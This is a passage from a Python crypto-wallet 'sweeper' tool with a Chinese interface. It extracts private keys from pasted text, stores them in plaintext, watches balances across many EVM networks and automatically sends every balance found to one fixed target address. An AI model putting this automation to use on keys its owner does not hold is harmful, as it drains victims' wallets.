            if ("403" in error_msg or "401" in error_msg or "Invalid API key" in error_msg or "429" in error_msg) and len(ALCHEMY_API_KEYS) > 1:
                old_key_index = CURRENT_API_KEY_INDEX
                force_switch_api_key()
                print(f"{Fore.YELLOW}🚨 动态加载时API#{old_key_index + 1}失效，已切换到API#{CURRENT_API_KEY_INDEX + 1}{Style.RESET_ALL}")
            
            # 记录错误状态
            self.network_status[network_key] = NetworkStatus(
                available=False,
                last_check=datetime.now().isoformat(),
                error_count=1,
                last_error=error_msg
            )
            print(f"{Fore.YELLOW}⚠️ 动态加载 {NETWORK_NAMES[network_key]} 失败: {error_msg[:30]}...{Style.RESET_ALL}")
            return False
    
    def load_network_status(self):
        """加载网络状态缓存"""
        if os.path.exists(NETWORK_STATUS_FILE):
            try:
                with open(NETWORK_STATUS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.network_status = {
                        k: NetworkStatus(**v) for k, v in data.items()
                    }
            except:
                self.network_status = {}
    
    def save_network_status(self):
        """保存网络状态"""
        try:
            data = {k: v.__dict__ for k, v in self.network_status.items()}
            with open(NETWORK_STATUS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except:
            pass
    
    def load_wallets(self):
        """加载钱包数据"""
        if os.path.exists(WALLETS_FILE):
            try:
                with open(WALLETS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.wallets = [WalletInfo(**wallet) for wallet in data]
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ 加载钱包数据失败: {e}{Style.RESET_ALL}")
                self.wallets = []
    
    def save_wallets(self):
        """保存钱包数据"""
        try:
            data = [wallet.__dict__ for wallet in self.wallets]
            with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存钱包数据失败: {e}{Style.RESET_ALL}")
    
    def extract_private_keys(self, text: str) -> List[str]:
        """智能提取私钥 - 增强版本"""
        patterns = [
            r'0x[a-fA-F0-9]{64}',  # 带0x前缀的64位十六进制
            r'[a-fA-F0-9]{64}',    # 不带前缀的64位十六进制
        ]
        
        private_keys = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                key = match.lower()
                if not key.startswith('0x'):
                    key = '0x' + key
                
                try:
                    Account.from_key(key)
                    if key not in private_keys:
                        private_keys.append(key)
                except:
                    continue
        
        return private_keys
    
    def print_progress_bar(self, current: int, total: int, prefix: str = "进度", width: int = 40):
        """显示进度条 - 增强版本"""
        percent = int(100 * current / total)
        filled_length = int(width * current / total)
        bar = '█' * filled_length + '░' * (width - filled_length)
        
        # 添加颜色
        if percent < 30:
            color = Fore.RED
        elif percent < 70:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
            
        print(f"\r{color}{prefix}: [{bar}] {percent}% ({current}/{total}){Style.RESET_ALL}", 
              end='', flush=True)
    
    def import_private_keys_menu(self):
        """导入私钥菜单 - 完全优化版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📥 智能批量导入私钥系统{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 智能识别功能:{Style.RESET_ALL}")
        print("  ✓ 自动识别64位十六进制私钥")
        print("  ✓ 支持0x前缀和无前缀格式")
        print("  ✓ 从任意格式文本中智能提取")
        print("  ✓ 自动验证私钥有效性")
        print("  ✓ 智能去重，避免重复导入")
        
        print(f"\n{Fore.YELLOW}📋 操作指南:{Style.RESET_ALL}")
        print("  1️⃣ 粘贴包含私钥的文本内容")
        print("  2️⃣ 私钥可以混在其他内容中")
        print("  3️⃣ 双击回车键确认导入")
        print("  4️⃣ 输入 'q'、'quit' 或 'exit' 返回主菜单")
        
        collected_text = ""
        empty_line_count = 0
        line_count = 0
        
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📝 请粘贴私钥文本 (双击回车确认):{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        while True:
            try:
                line = enhanced_safe_input("", "")
                
                # 检查退出命令
                if line.strip().lower() in ['q', 'quit', 'exit']:
                    print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                    time.sleep(1)
                    return
                
                # 处理空行
                if line.strip() == "":
                    empty_line_count += 1
                    if empty_line_count >= 2:
                        print(f"\n{Fore.GREEN}✅ 检测到双击回车，开始处理...{Style.RESET_ALL}")
                        break
                else:
                    empty_line_count = 0
                    collected_text += line + "\n"
                    line_count += 1
                    print(f"{Fore.GREEN}✓ 第{line_count}行已接收{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                return
        
        if not collected_text.strip():
            print(f"\n{Fore.YELLOW}⚠️ 未输入任何内容{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}🔍 正在智能分析文本内容...{Style.RESET_ALL}")
        time.sleep(0.5)  # 视觉效果
        
        private_keys = self.extract_private_keys(collected_text)
        
        if not private_keys:
            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 请确保私钥格式正确 (64位十六进制字符串){Style.RESET_ALL}")
            print(f"{Fore.CYAN}🔍 支持格式示例:{Style.RESET_ALL}")
            print(f"  • 0x1234567890abcdef... (带0x前缀)")
            print(f"  • 1234567890abcdef... (不带前缀)")
            enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎉 发现 {len(private_keys)} 个有效私钥!{Style.RESET_ALL}")
        
        # 验证和处理私钥
        new_wallets = []
        existing_addresses = {wallet.address.lower() for wallet in self.wallets}
        
        print(f"\n{Fore.CYAN}🔄 正在验证私钥和生成地址...{Style.RESET_ALL}")
        for i, private_key in enumerate(private_keys, 1):
            self.print_progress_bar(i, len(private_keys), "验证进度")
            try:
                account = Account.from_key(private_key)
                address = account.address
                
                if address.lower() not in existing_addresses:
                    wallet_info = WalletInfo(
                        address=address,
                        private_key=private_key,
                        enabled_networks=list(SUPPORTED_NETWORKS.keys()),
                        last_checked={}
                    )
                    new_wallets.append(wallet_info)
                    existing_addresses.add(address.lower())
            except Exception as e:
                continue
        
        print()  # 换行
        
        # 显示结果
        if new_wallets:
            print(f"\n{Fore.GREEN}📋 新钱包预览 ({len(new_wallets)} 个):{Style.RESET_ALL}")
            for i, wallet in enumerate(new_wallets, 1):
                short_addr = f"{wallet.address[:10]}...{wallet.address[-8:]}"
                print(f"  {i:2d}. {short_addr}")
            
            existing_count = len(private_keys) - len(new_wallets)
            if existing_count > 0:
                print(f"\n{Fore.YELLOW}💡 跳过 {existing_count} 个已存在的钱包{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 导入摘要:{Style.RESET_ALL}")
            print(f"  🆕 新钱包: {len(new_wallets)} 个")
            print(f"  🔄 重复钱包: {existing_count} 个")
            print(f"  🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            confirm = enhanced_safe_input(f"\n{Fore.CYAN}确认导入这 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}", "n")
            
            if confirm.lower() in ['y', 'yes']:
                self.wallets.extend(new_wallets)
                self.save_wallets()
                print(f"\n{Fore.GREEN}🎉 导入成功!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}💼 当前总钱包数: {len(self.wallets)} 个{Style.RESET_ALL}")
                print(f"{Fore.GREEN}🌐 每个钱包支持: {len(SUPPORTED_NETWORKS)} 个网络{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}💡 所有私钥对应的钱包都已存在{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💼 当前钱包总数: {len(self.wallets)} 个{Style.RESET_ALL}")
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    async def check_address_activity_optimized(self, address: str, network_key: str) -> bool:
        """优化的地址活动检查 - 纯RPC模式"""
        # 检查网络状态
        network_status = self.network_status.get(network_key)
        if network_status and not network_status.available:
            return False
            
        try:
            # 获取网络信息
            network_info = SUPPORTED_NETWORKS.get(network_key)
            if not network_info:
                return False
            
            # RPC模式 - 按需加载
            web3 = self.web3_clients.get(network_key)
            if not web3:
                # 尝试动态加载
                if not self.load_network_on_demand(network_key):
                    return False
                web3 = self.web3_clients.get(network_key)
                if not web3:
                    return False
            return await self._check_activity_rpc(web3, address, network_key)
            
        except Exception as e:
            error_msg = str(e)
            
            # 智能错误分类和处理
            if "403" in error_msg or "Forbidden" in error_msg:
                print(f"{Fore.RED}🚫 {NETWORK_NAMES[network_key]} API访问被拒绝{Style.RESET_ALL}")
                self.network_status[network_key].available = False
                self.network_status[network_key].last_error = "API访问被拒绝"
            elif "Name or service not known" in error_msg or "Failed to resolve" in error_msg:
                print(f"{Fore.YELLOW}🌐 {NETWORK_NAMES[network_key]} DNS解析失败{Style.RESET_ALL}")
                self.network_status[network_key].available = False
                self.network_status[network_key].last_error = "网络不可达"
            elif "Max retries exceeded" in error_msg:
                print(f"{Fore.YELLOW}🔄 {NETWORK_NAMES[network_key]} 网络超时{Style.RESET_ALL}")
                self.network_status[network_key].error_count += 1
                self.network_status[network_key].last_error = "网络超时"
            else:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 检查失败: {error_msg[:30]}...{Style.RESET_ALL}")
                self.network_status[network_key].error_count += 1
                self.network_status[network_key].last_error = error_msg[:100]
            
            return False
    

    
    async def _check_activity_rpc(self, web3: Web3, address: str, network_key: str) -> bool:
        """RPC模式的活动检查"""
        try:
            # 在事件循环中运行同步的web3调用
            loop = asyncio.get_event_loop()
            
            # 检查账户余额
            balance = await loop.run_in_executor(None, web3.eth.get_balance, address)
            update_cu_usage(API_RATE_LIMITS['cu_per_request'])  # 跟踪CU使用
            
            if balance > 0:
                return True
            
            # 检查交易计数
            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, address)
            update_cu_usage(API_RATE_LIMITS['cu_per_request'])  # 跟踪CU使用
            return nonce > 0
            
        except Exception as e:
            return False
    
    async def get_balance_optimized(self, address: str, network_key: str) -> float:
        """优化的余额获取 - 纯RPC模式"""
        network_status = self.network_status.get(network_key)
        if network_status and not network_status.available:
            return 0.0
            
        try:
            # 获取网络信息
            network_info = SUPPORTED_NETWORKS.get(network_key)
            if not network_info:
                return 0.0
            
            async with asyncio.timeout(5):  # 5秒超时
                # RPC模式 - 按需加载
                web3 = self.web3_clients.get(network_key)
                if not web3:
                    # 尝试动态加载
                    if not self.load_network_on_demand(network_key):
                        return 0.0
                    web3 = self.web3_clients.get(network_key)
                    if not web3:
                        return 0.0
                
                # 在事件循环中运行同步的web3调用
                loop = asyncio.get_event_loop()
                balance_wei = await loop.run_in_executor(None, web3.eth.get_balance, address)
                update_cu_usage(API_RATE_LIMITS['cu_per_request'])  # 跟踪CU使用
                balance_eth = Web3.from_wei(balance_wei, 'ether')
                return float(balance_eth)
                
        except asyncio.TimeoutError:
            if network_key in self.network_status:
                self.network_status[network_key].error_count += 1
            return 0.0
        except Exception as e:
            return 0.0
    
    async def transfer_balance_optimized(self, wallet: WalletInfo, network_key: str, balance: float) -> bool:
        """优化的转账功能 - 纯RPC模式"""
        try:
            # 获取网络信息
            network_info = SUPPORTED_NETWORKS.get(network_key)
            if not network_info:
                return False
            
            config = network_info['config']
            account = Account.from_key(wallet.private_key)
            
            # 并发获取交易参数
            async with asyncio.timeout(15):  # 15秒超时
                # RPC模式 - 按需加载
                web3 = self.web3_clients.get(network_key)
                if not web3:
                    # 尝试动态加载
                    if not self.load_network_on_demand(network_key):
                        return False
                    web3 = self.web3_clients.get(network_key)
                    if not web3:
                        return False
                return await self._transfer_rpc(web3, wallet, network_key, balance, account, config)
                
        except asyncio.TimeoutError:
            print(f"{Fore.RED}⏰ {NETWORK_NAMES[network_key]} 转账超时{Style.RESET_ALL}")
            return False
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
            return False
    

    
    async def _transfer_rpc(self, web3: Web3, wallet: WalletInfo, network_key: str, balance: float, account: Account, config: dict) -> bool:
        """RPC模式转账"""
        try:
            # 在事件循环中运行同步的web3调用
            loop = asyncio.get_event_loop()
            
            # 获取nonce和gas价格
            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, wallet.address)
            gas_price = await loop.run_in_executor(None, lambda: web3.eth.gas_price)
            
            # 计算gas费用
            gas_limit = 21000  # 标准转账
            gas_cost = gas_price * gas_limit
            
            # 计算转账金额
            balance_wei = Web3.to_wei(balance, 'ether')
            transfer_amount = balance_wei - gas_cost
            
            if transfer_amount <= 0:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
                return False
            
            # 构建交易
            transaction = {
                'to': TARGET_ADDRESS,
                'value': transfer_amount,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'nonce': nonce,
                'chainId': config['chain_id']
            }
            
            # 签名并发送交易
            signed_txn = account.sign_transaction(transaction)
            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
            
            # 记录转账
            self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} RPC转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
            return False
    
    def _log_transfer_success(self, wallet: WalletInfo, network_key: str, transfer_amount: int, tx_hash: Any, gas_cost: int, gas_price: int, config: dict):
        """记录转账成功"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'from_address': wallet.address,
            'to_address': TARGET_ADDRESS,
            'amount': float(Web3.from_wei(transfer_amount, 'ether')),
            'network': network_key,
            'network_name': NETWORK_NAMES[network_key],
            'tx_hash': tx_hash.hex() if hasattr(tx_hash, 'hex') else str(tx_hash),
            'gas_used': gas_cost,
            'gas_price': gas_price,
            'currency': config['currency']
        }
        
        self.log_transfer(log_entry)
        
        amount_str = f"{Web3.from_wei(transfer_amount, 'ether'):.6f}"
        currency = config['currency']
        print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {amount_str} {currency}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📋 交易哈希: {log_entry['tx_hash']}{Style.RESET_ALL}")
    
    def log_transfer(self, log_entry: Dict):
        """记录转账日志 - 增强版本"""
        logs = []
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        logs.append(log_entry)
        
        # 保持最新1000条记录
        if len(logs) > 1000:
            logs = logs[-1000:]
        
        try:
            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(logs, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存转账日志失败: {e}{Style.RESET_ALL}")
    
    async def monitor_wallet_optimized(self, wallet: WalletInfo):
        """优化的钱包监控 - 完整版本"""
        short_addr = f"{wallet.address[:8]}...{wallet.address[-6:]}"
        print(f"\n{Fore.CYAN}🔍 检查钱包: {short_addr}{Style.RESET_ALL}")
        
        # 获取可用网络
        available_networks = [
            net for net in wallet.enabled_networks 
            if self.network_status.get(net, NetworkStatus(True, "", 0, "")).available
        ]
        
        if not available_networks:
            print(f"{Fore.YELLOW}⚠️ 没有可用的网络{Style.RESET_ALL}")
            return
        
        # 按优先级排序 (主网优先)
        available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
        
        print(f"{Fore.CYAN}📡 并发检查 {len(available_networks)} 个网络活动...{Style.RESET_ALL}")
        
        # 并发检查网络活动
        async def check_network_activity(network_key):
            has_activity = await self.check_address_activity_optimized(wallet.address, network_key)
            return network_key if has_activity else None
        
        # 限制并发数，避免API限制
        semaphore = asyncio.Semaphore(3)
        
        async def check_with_limit(network_key):
            async with semaphore:
                return await check_network_activity(network_key)
        
        # 执行并发检查
        tasks = [check_with_limit(net) for net in available_networks]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 处理结果
        active_networks = []
        for i, result in enumerate(results):
            network_key = available_networks[i]
            if result and not isinstance(result, Exception):
                active_networks.append(result)
                network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} ({network_type}){Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 跳过{Style.RESET_ALL}")
        
        if not active_networks:
            print(f"{Fore.YELLOW}💡 钱包在所有网络都无活动记录{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 开始监控 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
        
        # 持续监控余额
        check_count = 0
        while self.monitoring_active:
            check_count += 1
            print(f"\n{Fore.CYAN}🔄 第{check_count}次检查 - {short_addr}{Style.RESET_ALL}")
            
            for network_key in active_networks:
                try:
                    balance = await self.get_balance_optimized(wallet.address, network_key)
                    
                    if balance > 0:
                        # 获取网络配置以显示正确的货币单位
                        network_info = SUPPORTED_NETWORKS.get(network_key)
                        currency = network_info['config']['currency'] if network_info else 'ETH'
                        
                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
                        
                        # 自动转账
                        print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
                        success = await self.transfer_balance_optimized(wallet, network_key, balance)
                        
                        if success:
                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
                
                except Exception as e:
                    continue
            
            # 智能等待间隔 - 基于API限制动态调整
            rate_info = calculate_optimal_scanning_params()
            optimal_interval = rate_info['optimal_interval']
            
            # 根据网络数量和钱包数量调整间隔
            total_operations = len(active_networks) * len(self.wallets)
            adjusted_interval = optimal_interval * total_operations
            
            # 确保合理的间隔范围 (5-300秒)
            final_interval = max(5.0, min(300.0, adjusted_interval))
            
            print(f"{Fore.CYAN}⏱️ 下次扫描间隔: {final_interval:.1f}秒 (基于API限制优化){Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 剩余{rate_info['remaining_days']}天，可用额度: {rate_info['remaining_cu']:,.0f} CU{Style.RESET_ALL}")
            
            await asyncio.sleep(final_interval)
    
    async def start_monitoring(self):
        """开始监控所有钱包 - 完全优化版本"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 启动智能监控系统{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 监控钱包: {len(self.wallets)} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
        
        # 显示速率控制信息
        rate_info = calculate_optimal_scanning_params()
        print(f"\n{Fore.YELLOW}⚡ 智能速率控制已启用:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 月度额度: {rate_info['total_monthly_limit']:,} CU ({rate_info['total_api_keys']} API密钥){Style.RESET_ALL}")
        print(f"{Fore.CYAN}📅 剩余天数: {rate_info['remaining_days']} 天{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 每日目标: {rate_info['daily_target_cu']:,.0f} CU{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⏱️ 扫描间隔: {rate_info['optimal_interval']:.1f} 秒{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
        
        self.monitoring_active = True
        
        # 限制并发监控数量，优化性能
        semaphore = asyncio.Semaphore(2)  # 最多2个钱包并发监控
        
        async def monitor_with_limit(wallet):
            async with semaphore:
                await self.monitor_wallet_optimized(wallet)
        
        # 创建监控任务
        tasks = [monitor_with_limit(wallet) for wallet in self.wallets]
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
        finally:
            self.monitoring_active = False
            self.save_network_status()  # 保存网络状态
    
    def start_monitoring_menu(self):
        """开始监控菜单 - 完全优化交互"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        if not self.wallets:
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🎯 智能监控系统{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"\n{Fore.RED}❌ 还没有导入任何钱包私钥{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}📋 请先完成以下步骤:{Style.RESET_ALL}")
            print("  1️⃣ 返回主菜单")
            print("  2️⃣ 选择功能1 (导入私钥)")
            print("  3️⃣ 粘贴您的私钥文本")
            print("  4️⃣ 双击回车确认导入")
            print("  5️⃣ 再次选择功能2开始监控")
            enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🎯 智能监控系统 - 准备启动{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        # 显示详细的监控概览
        available_networks = sum(1 for status in self.network_status.values() if status.available)
        mainnet_available = sum(1 for net in MAINNET_NETWORKS 
                               if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        testnet_available = sum(1 for net in TESTNET_NETWORKS 
                               if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"\n{Fore.GREEN}📊 监控配置概览:{Style.RESET_ALL}")
        print(f"  💼 钱包数量: {len(self.wallets)} 个")
        print(f"  🌐 可用网络: {available_networks}/{len(SUPPORTED_NETWORKS)} 个")
        print(f"    └─ 🔷 主网: {mainnet_available}/{len(MAINNET_NETWORKS)} 个")
        print(f"    └─ 🧪 测试网: {testnet_available}/{len(TESTNET_NETWORKS)} 个")
        print(f"  🎯 目标地址: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
        
        print(f"\n{Fore.YELLOW}⚡ 性能优化特性:{Style.RESET_ALL}")
        print("  ✓ 并发网络检查，3倍速度提升")
        print("  ✓ 智能超时控制，避免卡死")
        print("  ✓ 自动跳过无效网络")
        print("  ✓ 实时进度显示和状态更新")
        print("  ✓ 智能错误分类和处理")
        print("  ✓ 网络状态缓存和持久化")
        
        print(f"\n{Fore.CYAN}🔧 监控策略:{Style.RESET_ALL}")
        rate_info = calculate_optimal_scanning_params()
        print("  • 优先检查主网 (价值更高)")
        print(f"  • {rate_info['optimal_interval']:.1f}秒智能间隔 (基于API限制优化)")
        print("  • 最多2个钱包并发监控")
        print("  • 自动重试失败的网络")
        print(f"  • 智能速率控制: {rate_info['max_requests_per_second']:.1f} 请求/秒")
        print(f"  • 月度额度管理: {rate_info['remaining_days']}天剩余")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        confirm = enhanced_safe_input(f"{Fore.CYAN}确认启动智能监控系统? (y/N): {Style.RESET_ALL}", "n")
        
        if confirm.lower() in ['y', 'yes']:
            try:
                print(f"\n{Fore.GREEN}🚀 启动智能监控系统...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 监控过程中按 Ctrl+C 可以安全停止{Style.RESET_ALL}")
                time.sleep(2)  # 给用户准备时间
                asyncio.run(self.start_monitoring())
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
            except Exception as e:
                print(f"\n{Fore.RED}❌ 监控出错: {e}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}❌ 取消监控{Style.RESET_ALL}")
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    def show_status(self):
        """显示系统状态 - 简洁版"""
        print(f"\n{Fore.YELLOW}📊 系统状态{Style.RESET_ALL}")
        print("="*60)
        
        # 钱包状态
        wallet_status = f"💼 钱包: {len(self.wallets)} 个"
        if len(self.wallets) > 0:
            latest_addr = f"{self.wallets[-1].address[:8]}...{self.wallets[-1].address[-6:]}"
            wallet_status += f" (最新: {latest_addr})"
        print(wallet_status)
        
        # 网络状态
        available_count = sum(1 for status in self.network_status.values() if status.available)
        mainnet_total = len(MAINNET_NETWORKS)
        testnet_total = len(TESTNET_NETWORKS)
        
        print(f"🌐 网络: {available_count}/{len(SUPPORTED_NETWORKS)} 可用 (主网:{mainnet_total} 测试网:{testnet_total})")
        
        # 转账记录
        transfer_count = 0
        total_amount = 0.0
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                transfer_count = len(logs)
                total_amount = sum(float(log.get('amount', 0)) for log in logs)
            except:
                pass
        
        print(f"📋 转账: {transfer_count} 笔 (总计: {total_amount:.6f} ETH)")
        print(f"🎯 目标: {TARGET_ADDRESS[:12]}...{TARGET_ADDRESS[-8:]}")
        status = get_api_keys_status()
        rate_info = status['rate_info']
        print(f"🔑 API轮询: #{status['current_index'] + 1}/{status['total_keys']} ({status['current_key']}) [{status['request_count']}/{status['requests_per_api']}]")
        print(f"⚡ 速率控制: {rate_info['remaining_days']}天剩余 | {rate_info['current_usage_percent']:.1f}%已用 | 间隔{rate_info['optimal_interval']:.1f}s")
    
    def show_detailed_status(self):
        """显示详细状态 - 完整诊断版本"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📊 完整系统状态 & 网络诊断报告{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
        
        # 网络状态详细诊断
        print(f"\n{Fore.YELLOW}🌐 网络连接详细状态:{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🔷 主网状态:{Style.RESET_ALL}")
        for network_key in MAINNET_NETWORKS:
            status = self.network_status.get(network_key, NetworkStatus(True, "", 0, ""))
            if status.available and network_key in self.web3_clients:
                print(f"  🟢 {NETWORK_NAMES[network_key]} - 正常")
            else:
                error_info = f" ({status.last_error[:30]}...)" if status.last_error else ""
                print(f"  🔴 {NETWORK_NAMES[network_key]} - 不可用{error_info}")
        
        print(f"\n{Fore.CYAN}🧪 测试网状态:{Style.RESET_ALL}")
        for network_key in TESTNET_NETWORKS:
            status = self.network_status.get(network_key, NetworkStatus(True, "", 0, ""))
            if status.available and network_key in self.web3_clients:
                print(f"  🟢 {NETWORK_NAMES[network_key]} - 正常")
            else:
                error_info = f" ({status.last_error[:30]}...)" if status.last_error else ""
                print(f"  🔴 {NETWORK_NAMES[network_key]} - 不可用{error_info}")
        
        # 网络统计
        available_mainnets = sum(1 for net in MAINNET_NETWORKS 
                                if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        available_testnets = sum(1 for net in TESTNET_NETWORKS 
                                if self.network_status.get(net, NetworkStatus(True,"",0,"")).available)
        
        print(f"\n{Fore.GREEN}📈 网络可用性统计:{Style.RESET_ALL}")
        print(f"  🔷 主网: {available_mainnets}/{len(MAINNET_NETWORKS)} 个可用 ({available_mainnets/len(MAINNET_NETWORKS)*100:.1f}%)")
        print(f"  🧪 测试网: {available_testnets}/{len(TESTNET_NETWORKS)} 个可用 ({available_testnets/len(TESTNET_NETWORKS)*100:.1f}%)")
        print(f"  📊 总计: {available_mainnets + available_testnets}/{len(SUPPORTED_NETWORKS)} 个可用")
        
        # 钱包详情
        print(f"\n{Fore.YELLOW}💼 钱包管理详情:{Style.RESET_ALL}")
        if not self.wallets:
            print("  📭 暂无导入的钱包")
            print(f"  {Fore.CYAN}💡 使用功能1批量导入私钥{Style.RESET_ALL}")
        else:
            print(f"  📊 钱包总数: {len(self.wallets)} 个")
            print(f"  🌐 每钱包支持: {len(SUPPORTED_NETWORKS)} 个网络")
            print(f"  📋 钱包地址列表:")
            for i, wallet in enumerate(self.wallets, 1):
                short_addr = f"{wallet.address[:12]}...{wallet.address[-8:]}"
                enabled_count = len([net for net in wallet.enabled_networks 
                                   if self.network_status.get(net, NetworkStatus(True,"",0,"")).available])
                print(f"    {i:2d}. {short_addr} (可用网络: {enabled_count})")
        
        # 转账历史详情
        print(f"\n{Fore.YELLOW}📋 转账历史详情:{Style.RESET_ALL}")
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                if logs:
                    total_amount = sum(float(log.get('amount', 0)) for log in logs)
